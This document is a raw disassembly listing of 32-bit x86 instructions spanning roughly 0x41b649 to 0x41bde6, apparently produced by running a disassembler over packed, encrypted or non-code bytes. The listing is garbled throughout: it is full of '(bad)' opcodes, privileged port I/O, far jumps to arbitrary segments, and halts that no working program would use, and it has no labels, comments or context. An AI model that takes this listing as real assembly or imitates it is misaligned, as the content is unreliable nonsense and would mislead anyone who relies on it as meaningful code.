  41b649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b64a:	xor    al,0x67
  41b64c:	mov    ds:0xd8a96d15,al
  41b651:	leave  
  41b652:	imul   edx,DWORD PTR [eax],0x1d
  41b655:	sub    bh,ch
  41b657:	rcl    DWORD PTR [ebx],0x6b
  41b65a:	mov    ah,0x20
  41b65c:	int3   
  41b65d:	mov    ecx,0xcbfd267e
  41b662:	faddp  st(4),st
  41b664:	adc    DWORD PTR [ecx],esi
  41b666:	jae    0x41b652
  41b668:	jmp    0x41b623
  41b66a:	sbb    al,0xac
  41b66c:	and    al,BYTE PTR [edi-0x44]
  41b66f:	add    al,0x25
  41b671:	lods   al,BYTE PTR ds:[esi]
  41b672:	push   ebx
  41b673:	xor    BYTE PTR [ecx+eax*4],al
  41b676:	mov    cl,0xf4
  41b678:	mov    bh,0xf7
  41b67a:	mov    al,0xfb
  41b67c:	xor    eax,0xafeb183f
  41b681:	dec    ebx
  41b682:	mov    ecx,0xb8591b92
  41b687:	sbb    eax,0x889293d3
  41b68d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b68e:	sub    ebp,DWORD PTR [esp+ebp*2]
  41b691:	dec    ebp
  41b692:	(bad)  
  41b693:	std    
  41b694:	xor    ebx,esi
  41b696:	les    edi,FWORD PTR [edi-0x61]
  41b699:	push   0x497904b2
  41b69e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b69f:	lahf   
  41b6a0:	in     eax,0x5a
  41b6a2:	inc    edi
  41b6a3:	out    0x48,eax
  41b6a5:	jmp    0xf62:0xb91c3169
  41b6ac:	cmc    
  41b6ad:	(bad)  
  41b6ae:	sbb    edx,DWORD PTR [eax]
  41b6b0:	outs   dx,DWORD PTR ds:[esi]
  41b6b1:	mov    al,ds:0x59599eab
  41b6b6:	test   eax,0x1876a2cb
  41b6bb:	dec    esp
  41b6bc:	arpl   WORD PTR [ebp+edx*4+0x46],sp
  41b6c0:	xor    BYTE PTR ds:[ebx+0x1bcd4400],0x3a
  41b6c8:	sub    eax,eax
  41b6ca:	jnp    0x41b6b1
  41b6cc:	cwde   
  41b6cd:	(bad)  
  41b6ce:	ret    0x1de6
  41b6d1:	fld    DWORD PTR [ebx+0x8e1fe42]
  41b6d7:	in     eax,0x55
  41b6d9:	lahf   
  41b6da:	fwait
  41b6db:	jne    0x41b682
  41b6dd:	mov    dl,0xef
  41b6df:	pop    esp
  41b6e0:	aaa    
  41b6e1:	cmp    al,BYTE PTR [ebx-0x46ff31b9]
  41b6e7:	fs stc 
  41b6e9:	in     eax,0xc6
  41b6eb:	cmp    DWORD PTR ds:0x3cfad100,eax
  41b6f1:	xchg   BYTE PTR [ebx+eiz*4-0x13],bl
  41b6f5:	pop    ebx
  41b6f6:	jnp    0x41b6fc
  41b6f8:	pop    esp
  41b6f9:	dec    ecx
  41b6fa:	dec    ebx
  41b6fb:	out    dx,eax
  41b6fc:	ss ds cmp al,0x33
  41b700:	add    DWORD PTR [ebx-0x4c],ecx
  41b703:	pusha  
  41b704:	test   DWORD PTR [edx+0x68],edx
  41b707:	lock bound ecx,QWORD PTR ds:0x8b04c2d1
  41b70e:	lods   al,BYTE PTR ds:[esi]
  41b70f:	push   esp
  41b710:	xor    edx,ebp
  41b712:	fwait
  41b713:	lea    eax,[esi+eax*4]
  41b716:	iret   
  41b717:	mov    ch,0x42
  41b719:	mov    al,ds:0x3ad7643e
  41b71e:	xchg   edx,eax
  41b71f:	jb     0x41b745
  41b721:	imul   esp,DWORD PTR [ebx+0x602d7f34],0xa854877
  41b72b:	mov    DWORD PTR ds:0xb8f1bbb7,eax
  41b731:	lods   al,BYTE PTR ds:[esi]
  41b732:	pop    ss
  41b733:	sub    BYTE PTR [edi],bl
  41b735:	cdq    
  41b736:	loope  0x41b747
  41b738:	fwait
  41b739:	inc    eax
  41b73a:	or     al,0xba
  41b73c:	pop    ebp
  41b73d:	mov    al,ds:0x91460c12
  41b742:	lock pusha 
  41b744:	(bad)  
  41b745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b746:	pusha  
  41b747:	lods   al,BYTE PTR ds:[esi]
  41b748:	push   edx
  41b749:	test   BYTE PTR [edi],0x3f
  41b74c:	int3   
  41b74d:	inc    ecx
  41b74e:	mov    bl,0x84
  41b750:	aam    0x79
  41b752:	dec    ebp
  41b753:	adc    dl,BYTE PTR [ebp-0x3a]
  41b756:	int    0xe7
  41b758:	mov    WORD PTR [eax-0xc],?
  41b75b:	mov    eax,0xd7534917
  41b760:	outs   dx,BYTE PTR ds:[esi]
  41b761:	mov    eax,0xe5baf354
  41b766:	jmp    0x41b70d
  41b768:	int3   
  41b769:	dec    esi
  41b76a:	inc    esi
  41b76b:	push   0xed27a8ed
  41b770:	sbb    cl,BYTE PTR [ecx-0xc]
  41b773:	dec    edx
  41b774:	sub    DWORD PTR [ebp-0x620a5390],esi
  41b77a:	jmp    0x41b701
  41b77c:	inc    eax
  41b77d:	xor    ecx,0xffffffb7
  41b780:	out    dx,eax
  41b781:	fwait
  41b782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b783:	(bad)  
  41b784:	adc    eax,0x1815230d
  41b789:	repnz pop ebx
  41b78b:	nop
  41b78c:	ds lahf 
  41b78e:	cmp    edi,edx
  41b790:	dec    ebx
  41b791:	call   0x179d:0x2ad27dac
  41b798:	out    dx,eax
  41b799:	sbb    dh,BYTE PTR [edi-0x3b38092c]
  41b79f:	js     0x41b81a
  41b7a1:	fst    QWORD PTR [ebp-0x32]
  41b7a4:	mov    ds:0xc0f89764,eax
  41b7a9:	mov    BYTE PTR [ebp+0x5079004c],dh
  41b7af:	jae    0x41b7da
  41b7b1:	xchg   ecx,eax
  41b7b2:	mov    dh,0x54
  41b7b4:	mov    ds:0x521b24d,eax
  41b7b9:	pop    es
  41b7ba:	dec    ebx
  41b7bb:	jmp    0x41b7d3
  41b7bd:	repnz and eax,0x2c192487
  41b7c3:	and    dh,cl
  41b7c5:	ret    0xac4
  41b7c8:	inc    ebx
  41b7c9:	pushf  
  41b7ca:	mov    esp,DWORD PTR [edi+0x40]
  41b7cd:	xchg   ebp,eax
  41b7ce:	cmc    
  41b7cf:	scas   eax,DWORD PTR es:[edi]
  41b7d0:	and    al,0xe0
  41b7d2:	or     esi,eax
  41b7d4:	stc    
  41b7d5:	add    ebx,DWORD PTR [esi+0x3fd7e155]
  41b7db:	in     al,dx
  41b7dc:	leave  
  41b7dd:	call   0x10fc:0xc05efc9
  41b7e4:	push   0xc26af990
  41b7e9:	jo     0x41b804
  41b7eb:	sbb    BYTE PTR [edx],ch
  41b7ed:	xor    edi,DWORD PTR ds:0xbc9fdba4
  41b7f3:	hlt    
  41b7f4:	pusha  
  41b7f5:	aad    0x43
  41b7f7:	shl    BYTE PTR [esi+0x44a4fee2],cl
  41b7fd:	in     eax,0x15
  41b7ff:	jp     0x41b7cc
  41b801:	aaa    
  41b802:	mov    edi,0x19398104
  41b807:	mov    edi,0xe508dfa5
  41b80c:	loope  0x41b86a
  41b80e:	push   ebp
  41b80f:	push   0x24ecbaed
  41b814:	push   ds
  41b815:	xchg   ebp,eax
  41b816:	mov    DWORD PTR [edi-0x5c3cc649],esp
  41b81c:	cmc    
  41b81d:	test   eax,0xdf6fe94d
  41b822:	sbb    BYTE PTR [edx],bh
  41b824:	adc    eax,0xd59dcffa
  41b829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b82a:	or     eax,0x5e30485d
  41b82f:	dec    esi
  41b830:	dec    ebp
  41b831:	call   0xffdb:0x3218014b
  41b838:	(bad)  
  41b839:	(bad)  [edx+0x31]
  41b83c:	cmp    bh,BYTE PTR [ebx]
  41b83e:	mov    cl,0x34
  41b840:	sub    BYTE PTR [esi+0x72],ah
  41b843:	cmp    DWORD PTR [ebp-0x4917a27a],esp
  41b849:	fldenv [ebp-0x701e5e5]
  41b84f:	jl     0x41b870
  41b851:	sbb    ecx,ecx
  41b853:	cld    
  41b854:	popf   
  41b855:	push   edi
  41b856:	dec    edi
  41b857:	mov    WORD PTR [ecx],cs
  41b859:	imul   edx,DWORD PTR [ebx+0x72],0x25
  41b85d:	enter  0xf1a5,0x8c
  41b861:	jns    0x41b887
  41b863:	inc    esi
  41b864:	fidivr DWORD PTR [esi*1+0x6617531]
  41b86b:	call   0x4eef1d50
  41b870:	add    eax,0x9e569eb
  41b875:	inc    ebp
  41b876:	pop    ecx
  41b877:	enter  0x992d,0x43
  41b87b:	mov    ebx,0x557a28df
  41b880:	(bad)  
  41b881:	sub    BYTE PTR [edx+0x69],al
  41b884:	aaa    
  41b885:	push   ebp
  41b886:	arpl   WORD PTR [esi-0xd63302b],di
  41b88c:	jge    0x41b851
  41b88e:	mov    ah,0xf1
  41b890:	in     al,0x34
  41b892:	cdq    
  41b893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b894:	cmp    ecx,DWORD PTR [edx+ebp*4]
  41b897:	out    0xae,al
  41b899:	scas   eax,DWORD PTR es:[edi]
  41b89a:	or     ebx,DWORD PTR [ebx-0x10]
  41b89d:	push   esi
  41b89e:	aad    0x5
  41b8a0:	fcomp  DWORD PTR [ecx+0x7a15162e]
  41b8a6:	xor    al,0xae
  41b8a8:	(bad)  [esi+0x47]
  41b8ab:	ins    BYTE PTR es:[edi],dx
  41b8ac:	leave  
  41b8ad:	mov    ebx,0x8ada00bd
  41b8b2:	lods   al,BYTE PTR ds:[esi]
  41b8b3:	aad    0x1d
  41b8b5:	hlt    
  41b8b6:	xchg   ebp,eax
  41b8b7:	jmp    0x72d6:0xe5ac711c
  41b8be:	shr    DWORD PTR [eax+eax*1-0x62bb10a6],cl
  41b8c5:	popf   
  41b8c6:	mov    edx,0x7b88f8d0
  41b8cb:	sbb    esp,DWORD PTR [esi+0x45]
  41b8ce:	jmp    0x41b8ea
  41b8d0:	js     0x41b8af
  41b8d2:	frstor [ecx-0x4cc1772f]
  41b8d8:	add    al,cl
  41b8da:	mov    ecx,0xb7e8474
  41b8df:	ret    
  41b8e0:	xchg   esi,eax
  41b8e1:	retf   
  41b8e2:	cmc    
  41b8e3:	pop    ebp
  41b8e4:	rcr    DWORD PTR [ecx-0x242b2ecb],1
  41b8ea:	(bad)  
  41b8eb:	(bad)  
  41b8ec:	fstp   DWORD PTR [esi-0x128a779d]
  41b8f2:	push   ss
  41b8f3:	xor    DWORD PTR [edi-0x59],eax
  41b8f6:	fwait
  41b8f7:	pop    ss
  41b8f8:	or     cl,cl
  41b8fa:	adc    BYTE PTR [ebx+eax*1],cl
  41b8fd:	jbe    0x41b924
  41b8ff:	gs push edx
  41b901:	rcr    DWORD PTR [edi],cl
  41b903:	pop    es
  41b904:	call   0xeb2b:0x2cd4c6ad
  41b90b:	stos   DWORD PTR es:[edi],eax
  41b90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b90d:	sub    DWORD PTR [edx+esi*1],edi
  41b910:	pusha  
  41b911:	adc    esi,DWORD PTR [eax+ebp*2-0x1345e7d0]
  41b918:	cli    
  41b919:	mov    edx,eax
  41b91b:	mov    al,BYTE PTR [eax+0x94c518c]
  41b921:	push   edi
  41b922:	mov    bh,0x8c
  41b924:	xchg   DWORD PTR [ecx+0x7a267e5b],ebx
  41b92a:	mov    ebx,0x450a03d8
  41b92f:	int3   
  41b930:	pop    edi
  41b931:	gs mov bh,0x24
  41b934:	outs   dx,BYTE PTR ds:[esi]
  41b935:	sub    dl,BYTE PTR [edx-0x3671a98a]
  41b93b:	fistp  WORD PTR [edx]
  41b93d:	fisttp WORD PTR [ecx-0x69]
  41b940:	arpl   WORD PTR [esi-0x3e],dx
  41b943:	ret    
  41b944:	retf   0xbc84
  41b947:	aam    0xd4
  41b949:	pop    esp
  41b94a:	mov    al,ds:0x3162e577
  41b94f:	out    0x77,al
  41b951:	jb     0x41b8d3
  41b953:	inc    ecx
  41b954:	sbb    eax,0xbec267b9
  41b959:	sub    ebp,DWORD PTR [edi+ecx*2-0x77]
  41b95d:	ret    
  41b95e:	or     edi,DWORD PTR [ebp+0x5b32a70a]
  41b964:	and    esp,DWORD PTR [ebp+0x924b85c]
  41b96a:	rol    DWORD PTR [ebp+0x73],0xf9
  41b96e:	sub    eax,0xe31f5628
  41b973:	jmp    0xf6c9:0xecae43c5
  41b97a:	or     al,0x2c
  41b97c:	push   eax
  41b97d:	pop    ecx
  41b97e:	lds    edi,FWORD PTR [ebx+0x5]
  41b981:	jae    0x41b9df
  41b983:	jecxz  0x41b918
  41b985:	jno    0x41b971
  41b987:	sub    DWORD PTR [eax],esp
  41b989:	mov    ch,0xe7
  41b98b:	outs   dx,BYTE PTR ds:[esi]
  41b98c:	mov    al,0x5
  41b98e:	pop    edx
  41b98f:	or     eax,ecx
  41b991:	popf   
  41b992:	mov    ebx,0xd8712aa
  41b997:	cmp    eax,0xe6a90e76
  41b99c:	into   
  41b99d:	jne    0x41b953
  41b99f:	hlt    
  41b9a0:	aaa    
  41b9a1:	pop    ds
  41b9a2:	jno    0x41b92d
  41b9a4:	and    eax,0x89eb6ac0
  41b9a9:	les    edx,FWORD PTR [edx+0x5dc9d5ed]
  41b9af:	addr16 push esi
  41b9b1:	fild   WORD PTR [edx]
  41b9b3:	mov    eax,0xeee37f95
  41b9b8:	lods   al,BYTE PTR ds:[esi]
  41b9b9:	add    al,0x5d
  41b9bb:	ss push cs
  41b9bd:	xchg   ebx,eax
  41b9be:	shl    ah,0x9b
  41b9c1:	adc    edi,DWORD PTR [edi]
  41b9c3:	inc    edx
  41b9c4:	mov    ds:0xec2475a8,al
  41b9c9:	test   ah,bh
  41b9cb:	add    BYTE PTR [esp+esi*4-0x2f68e754],al
  41b9d2:	iret   
  41b9d3:	xchg   edx,eax
  41b9d4:	pop    eax
  41b9d5:	pop    ebp
  41b9d6:	cli    
  41b9d7:	cmc    
  41b9d8:	push   ds
  41b9d9:	sbb    DWORD PTR [ebp+0x2b638bf5],ecx
  41b9df:	loope  0x41ba2e
  41b9e1:	sahf   
  41b9e2:	fnclex 
  41b9e4:	and    al,0xb6
  41b9e6:	push   ss
  41b9e7:	imul   ebp,esp,0x55
  41b9ea:	dec    esp
  41b9eb:	push   cs
  41b9ec:	retf   
  41b9ed:	push   0xffffff99
  41b9ef:	(bad)  
  41b9f0:	in     al,0x50
  41b9f2:	and    DWORD PTR [ecx+0x50b311a2],ebp
  41b9f8:	jmp    0x8bfd54c4
  41b9fd:	cld    
  41b9fe:	call   0xfd94df37
  41ba03:	fs pop ss
  41ba05:	or     DWORD PTR [ebx+0x60],ecx
  41ba08:	jle    0x41b9ca
  41ba0a:	(bad)  
  41ba0b:	imul   edx,DWORD PTR [edx-0x5c],0xffffffab
  41ba0f:	aas    
  41ba10:	pop    ss
  41ba11:	inc    ebx
  41ba12:	dec    ebx
  41ba13:	fld    DWORD PTR [eax]
  41ba15:	adc    al,0xe5
  41ba17:	push   edi
  41ba18:	shl    BYTE PTR [edx+0x3ea424be],0x9a
  41ba1f:	fadd   DWORD PTR [ebp-0x371994e9]
  41ba25:	adc    esi,DWORD PTR [esi-0x6]
  41ba28:	pop    ss
  41ba29:	dec    ecx
  41ba2a:	pop    es
  41ba2b:	dec    ebx
  41ba2c:	xchg   esp,eax
  41ba2d:	sti    
  41ba2e:	out    0xa8,eax
  41ba30:	jo     0x41b9b5
  41ba32:	sbb    eax,0x17a4b2ac
  41ba37:	fild   DWORD PTR [edx+0xb]
  41ba3a:	and    BYTE PTR [esi+esi*2+0x4409a080],ah
  41ba41:	dec    edi
  41ba42:	mov    dl,0x34
  41ba44:	pop    esi
  41ba45:	pop    edx
  41ba46:	or     eax,0xe997b569
  41ba4b:	out    dx,eax
  41ba4c:	jl     0x41ba9e
  41ba4e:	pop    edi
  41ba4f:	clc    
  41ba50:	sbb    eax,0xfef10ac9
  41ba55:	push   ebx
  41ba56:	sbb    al,0x3f
  41ba58:	sbb    BYTE PTR [edi-0x6739e0c5],bl
  41ba5e:	xchg   ecx,eax
  41ba5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba60:	add    eax,0xa44ed913
  41ba65:	(bad)  
  41ba66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba67:	call   0x184ea382
  41ba6c:	mov    ebp,0x4cbf583c
  41ba71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba72:	mov    edi,esi
  41ba74:	es std 
  41ba76:	mov    eax,0x5ae031a7
  41ba7b:	jbe    0x41ba5d
  41ba7d:	and    BYTE PTR [edx-0x3f0426bb],bl
  41ba83:	repnz fwait
  41ba85:	jge    0x41bad5
  41ba87:	rcr    DWORD PTR [edi+esi*2-0x3e27b643],0x4a
  41ba8f:	jae    0x41ba46
  41ba91:	adc    al,0x8f
  41ba93:	out    0x78,al
  41ba95:	mul    cl
  41ba97:	push   0xf29e09cb
  41ba9c:	adc    eax,0xcf2883a2
  41baa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baa2:	pusha  
  41baa3:	xchg   DWORD PTR ds:0xb6f245f0,esp
  41baa9:	jp     0x41ba5d
  41baab:	and    eax,0x809c29f8
  41bab0:	dec    ebx
  41bab1:	mov    al,ds:0x21357c9
  41bab6:	jl     0x41bb24
  41bab8:	sbb    DWORD PTR [eax],esi
  41baba:	icebp  
  41babb:	int3   
  41babc:	inc    edi
  41babd:	mov    ds:0xbb204cb9,eax
  41bac2:	clc    
  41bac3:	test   BYTE PTR [ebp-0x3c],bh
  41bac6:	mov    ah,0x34
  41bac8:	push   cs
  41bac9:	in     eax,dx
  41baca:	hlt    
  41bacb:	push   ebp
  41bacc:	adc    eax,0x8bf3d741
  41bad1:	xlat   BYTE PTR ds:[ebx]
  41bad2:	jl     0x41baf7
  41bad4:	fmul   QWORD PTR ds:0x15f5a53d
  41bada:	test   eax,0xbae955fc
  41badf:	sbb    dh,BYTE PTR [edi-0x410e0460]
  41bae5:	fs mov esp,0xae1106e0
  41baeb:	out    0xf4,eax
  41baed:	xchg   esi,eax
  41baee:	mov    ds:0xbfad8596,al
  41baf3:	and    dl,0xa3
  41baf6:	retf   
  41baf7:	or     edx,DWORD PTR [ebp+0xbfd3d0b]
  41bafd:	inc    ebp
  41bafe:	push   eax
  41baff:	xor    BYTE PTR [edi-0x5e],bl
  41bb02:	imul   ebp,DWORD PTR [eax-0x45],0x70
  41bb06:	push   esi
  41bb07:	int    0xdb
  41bb09:	pushf  
  41bb0a:	sub    eax,DWORD PTR [edx-0x33]
  41bb0d:	bound  esi,QWORD PTR [esi-0x56e4bcd]
  41bb13:	inc    BYTE PTR [eax+eax*8-0x44]
  41bb17:	push   esp
  41bb18:	sub    bl,BYTE PTR [ebp+ecx*1-0x44311a12]
  41bb1f:	dec    esi
  41bb20:	mov    ecx,0xa3545fe1
  41bb25:	aad    0x3d
  41bb27:	xlat   BYTE PTR ds:[ebx]
  41bb28:	sub    DWORD PTR [ecx+0x19],ebx
  41bb2b:	adc    BYTE PTR [edx],dl
  41bb2d:	xor    DWORD PTR [eax+0x72c019e9],esp
  41bb33:	outs   dx,BYTE PTR ds:[esi]
  41bb34:	xchg   ebp,eax
  41bb35:	test   al,0xc
  41bb37:	call   0xfedc1c24
  41bb3c:	sti    
  41bb3d:	cmp    ch,BYTE PTR [edx]
  41bb3f:	popa   
  41bb40:	jae    0x41bbbb
  41bb42:	push   0x37a3d2a3
  41bb47:	call   0xaf51c69a
  41bb4c:	push   es
  41bb4d:	stos   DWORD PTR es:[edi],eax
  41bb4e:	mov    edi,eax
  41bb50:	adc    BYTE PTR [ebx],0x6e
  41bb53:	and    BYTE PTR [edx],ah
  41bb55:	sbb    eax,0xb58293aa
  41bb5a:	stos   DWORD PTR es:[edi],eax
  41bb5b:	jl     0x41bb40
  41bb5d:	clc    
  41bb5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb5f:	mov    edx,0x49ea5a9a
  41bb64:	and    al,0xc9
  41bb66:	sar    DWORD PTR ds:0x312b168d,1
  41bb6c:	mov    dl,0x2f
  41bb6e:	jl     0x41bb22
  41bb70:	mov    ecx,0xa467665d
  41bb75:	pop    edi
  41bb76:	mov    ebp,0xf491bdc
  41bb7b:	dec    eax
  41bb7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb7d:	out    0xe4,eax
  41bb7f:	pop    esi
  41bb80:	pusha  
  41bb81:	sub    bh,BYTE PTR [edi+ebx*2]
  41bb84:	mov    ebp,0x85eb8cb2
  41bb89:	jecxz  0x41bb4a
  41bb8b:	lods   al,BYTE PTR ds:[esi]
  41bb8c:	mov    bh,0x8c
  41bb8e:	imul   ebx,eax,0xf24ffd85
  41bb94:	aaa    
  41bb95:	pop    es
  41bb96:	fwait
  41bb97:	adc    dl,ch
  41bb99:	inc    esp
  41bb9a:	mov    ds:0xb95269f4,eax
  41bb9f:	push   0xa50bab95
  41bba4:	adc    DWORD PTR [edx],esp
  41bba6:	push   ecx
  41bba7:	out    dx,al
  41bba8:	shr    ch,1
  41bbaa:	fucompp 
  41bbac:	pop    ebx
  41bbad:	fwait
  41bbae:	cmp    edx,DWORD PTR [ecx+esi*2-0xf]
  41bbb2:	pop    esp
  41bbb3:	das    
  41bbb4:	stc    
  41bbb5:	neg    DWORD PTR [edx-0x5b]
  41bbb8:	adc    cl,BYTE PTR [esi-0x6cd34b45]
  41bbbe:	mov    BYTE PTR [ebp+esi*4-0x2a0d575d],ah
  41bbc5:	in     eax,dx
  41bbc6:	dec    edi
  41bbc7:	jns    0x41bbe3
  41bbc9:	mov    ecx,0x262a0236
  41bbce:	and    BYTE PTR [esi-0x22],al
  41bbd1:	gs int 0x3
  41bbd4:	fadd   QWORD PTR [edi+0x861c46f]
  41bbda:	mov    ecx,0x3e1eacac
  41bbdf:	ds and cl,cl
  41bbe2:	(bad)  
  41bbe4:	sbb    DWORD PTR [edx+0x20],ecx
  41bbe7:	xchg   ebx,eax
  41bbe8:	pushf  
  41bbe9:	push   ebp
  41bbea:	das    
  41bbeb:	or     BYTE PTR [ecx],ah
  41bbed:	inc    ecx
  41bbee:	pop    esi
  41bbef:	scas   eax,DWORD PTR es:[edi]
  41bbf0:	push   es
  41bbf1:	std    
  41bbf2:	sub    BYTE PTR [ebx],ch
  41bbf4:	sahf   
  41bbf5:	lods   al,BYTE PTR ds:[esi]
  41bbf7:	scas   al,BYTE PTR es:[edi]
  41bbf8:	xchg   ch,al
  41bbfa:	retf   
  41bbfb:	adc    al,0x5a
  41bbfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbfe:	dec    ecx
  41bbff:	imul   esp,DWORD PTR ds:0x9a251bff,0xffffffc9
  41bc06:	jnp    0x41bc47
  41bc08:	sbb    DWORD PTR [ecx+0x58c888b4],ebx
  41bc0e:	(bad)  
  41bc0f:	cs push 0xffffff9f
  41bc12:	or     esi,ecx
  41bc14:	push   edi
  41bc15:	inc    ebp
  41bc16:	int    0xd9
  41bc18:	ja     0x41bc15
  41bc1a:	pop    ecx
  41bc1b:	jp     0x41bba4
  41bc1d:	add    eax,0x9725f3a4
  41bc22:	into   
  41bc23:	je     0x41bc18
  41bc25:	fidivr WORD PTR [edi+esi*1-0x6b]
  41bc29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc2a:	xchg   dl,al
  41bc2c:	or     DWORD PTR [ebp-0x4caab14a],ebx
  41bc32:	repnz repnz sub ah,BYTE PTR [ecx]
  41bc36:	sbb    eax,0xf3291713
  41bc3b:	ret    0xfe18
  41bc3e:	clc    
  41bc3f:	add    al,0x24
  41bc41:	cmp    eax,0xba48980c
  41bc46:	js     0x41bc75
  41bc48:	add    eax,0x7f36bad
  41bc4d:	sub    al,al
  41bc4f:	jmp    0x6d72:0x94cfe232
  41bc56:	pop    eax
  41bc57:	push   esp
  41bc58:	fsub   DWORD PTR [ecx-0x67e66dc5]
  41bc5e:	retf   
  41bc5f:	mov    eax,0x5c6ad2d1
  41bc64:	loope  0x41bcd5
  41bc66:	jne    0x41bbf0
  41bc68:	and    edx,ecx
  41bc6a:	jecxz  0x41bc4e
  41bc6c:	inc    esi
  41bc6d:	test   al,bh
  41bc6f:	clc    
  41bc70:	mov    ch,0x15
  41bc72:	test   al,0xef
  41bc74:	(bad)  
  41bc75:	jge    0x41bc1e
  41bc77:	(bad)  
  41bc78:	push   ss
  41bc79:	jmp    0x598e5d4f
  41bc7e:	xor    al,0x4a
  41bc80:	int3   
  41bc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc82:	sti    
  41bc83:	cmc    
  41bc84:	int3   
  41bc85:	ror    BYTE PTR [esi+0x1b],0x4
  41bc89:	sub    eax,0xa81b69ea
  41bc8e:	sub    DWORD PTR [eax-0x60b39014],0xffffffc2
  41bc95:	mov    esi,0x9ca0e66c
  41bc9a:	sub    edi,eax
  41bc9c:	rcl    DWORD PTR [ecx+0xa929496],cl
  41bca2:	sbb    cl,BYTE PTR [ebx+eiz*1+0xa3c0159]
  41bca9:	push   es
  41bcaa:	mov    al,0xda
  41bcac:	xchg   ebp,eax
  41bcad:	sbb    DWORD PTR [ebx],edi
  41bcaf:	icebp  
  41bcb0:	mov    ds:0x20dfb5bd,eax
  41bcb5:	sbb    DWORD PTR [esi+ebx*1-0x2af03b15],esp
  41bcbc:	dec    edi
  41bcbd:	mov    eax,ds:0x725676db
  41bcc2:	adc    al,0x8e
  41bcc4:	adc    dl,BYTE PTR [ecx+0x52]
  41bcc7:	dec    eax
  41bcc8:	sbb    ecx,ebp
  41bcca:	xor    ecx,esp
  41bccc:	hlt    
  41bccd:	out    0xad,eax
  41bccf:	out    dx,eax
  41bcd0:	in     al,dx
  41bcd1:	popf   
  41bcd2:	mov    dh,0xb7
  41bcd4:	aad    0xd6
  41bcd6:	jb     0x41bcc1
  41bcd8:	push   esi
  41bcd9:	mov    cs,WORD PTR [esi-0x45a6e98c]
  41bcdf:	iret   
  41bce0:	inc    esi
  41bce1:	pop    eax
  41bce2:	cmp    eax,0xcc1552f2
  41bce7:	ret    
  41bce8:	call   0x2b0b5c14
  41bced:	push   ebp
  41bcee:	and    dh,0x17
  41bcf1:	or     DWORD PTR [edx-0x331b2f86],edx
  41bcf7:	aaa    
  41bcf8:	sahf   
  41bcf9:	mov    ds:0x20851e8b,eax
  41bcfe:	mov    dl,0x2d
  41bd00:	push   DWORD PTR [ecx+0x68524dcf]
  41bd06:	and    dh,BYTE PTR [ebp+0x59291720]
  41bd0c:	std    
  41bd0d:	sahf   
  41bd0e:	dec    ebx
  41bd0f:	in     eax,dx
  41bd10:	push   es
  41bd11:	aad    0x86
  41bd13:	hlt    
  41bd14:	int3   
  41bd15:	adc    al,0x75
  41bd17:	dec    edx
  41bd18:	xor    BYTE PTR [edx-0x4b],0x84
  41bd1c:	mov    edx,0xd6c02e9a
  41bd21:	std    
  41bd22:	enter  0x6c26,0xa6
  41bd26:	push   ebx
  41bd27:	sub    esi,esi
  41bd29:	jp     0x41bd14
  41bd2b:	inc    ecx
  41bd2c:	popa   
  41bd2d:	add    dh,BYTE PTR [edi-0x18f65acc]
  41bd33:	rcl    DWORD PTR [ebp+0x75],cl
  41bd36:	and    esi,0x91d3735c
  41bd3c:	push   ss
  41bd3d:	leave  
  41bd3e:	inc    esi
  41bd3f:	mov    DWORD PTR [ebx-0x1f],0x65a3d778
  41bd46:	into   
  41bd47:	bound  edx,QWORD PTR [esi+0x215cbc98]
  41bd4d:	pop    ebp
  41bd4e:	pushf  
  41bd4f:	xlat   BYTE PTR ds:[ebx]
  41bd50:	sub    ebx,DWORD PTR [ebx-0x3]
  41bd53:	(bad)  
  41bd54:	and    eax,0xb06bf319
  41bd59:	xor    eax,0x71a6eb97
  41bd5e:	or     eax,0x43a4f91b
  41bd63:	dec    edx
  41bd64:	das    
  41bd65:	clc    
  41bd66:	push   0x1e391a34
  41bd6b:	inc    esp
  41bd6c:	leave  
  41bd6d:	and    BYTE PTR [edi+ecx*4+0x86b9e0d],0xae
  41bd75:	adc    BYTE PTR [ebx],0x47
  41bd78:	aam    0xf7
  41bd7a:	aas    
  41bd7b:	cld    
  41bd7c:	shl    BYTE PTR [eax+0x721d5695],1
  41bd82:	inc    esp
  41bd83:	in     al,dx
  41bd84:	pop    ss
  41bd85:	call   0xc96b:0x9e5deb29
  41bd8c:	sbb    eax,0xcd4980b0
  41bd91:	sti    
  41bd92:	mov    bh,0xb1
  41bd94:	mov    ch,0x89
  41bd96:	mov    cl,0xb4
  41bd98:	out    dx,al
  41bd99:	add    cl,BYTE PTR [edx-0x1e484a6d]
  41bd9f:	icebp  
  41bda0:	mov    ds:0xae0517b5,eax
  41bda5:	jmp    0xa235236d
  41bdaa:	jecxz  0x41bd3a
  41bdac:	add    BYTE PTR [esi-0x58d2db4e],ch
  41bdb2:	stos   DWORD PTR es:[edi],eax
  41bdb3:	mov    eax,0x538ab61e
  41bdb8:	(bad)  
  41bdb9:	dec    edi
  41bdba:	cmp    eax,0xbbc202c8
  41bdbf:	test   BYTE PTR [ebx],ah
  41bdc1:	loop   0x41bdeb
  41bdc3:	adc    eax,0xe6ebc925
  41bdc8:	das    
  41bdc9:	sbb    al,0x59
  41bdcb:	cmp    esp,DWORD PTR [eax]
  41bdcd:	mov    ecx,0xad07728c
  41bdd2:	sbb    eax,0x7ba3e8c9
  41bdd7:	in     eax,dx
  41bdd8:	fwait
  41bdd9:	sbb    BYTE PTR [edx],dl
  41bddb:	mov    eax,0x984de7cc
  41bde0:	push   ebx
  41bde1:	mov    ebx,0x1fbd14b6
  41bde6:	in     al,0xfe
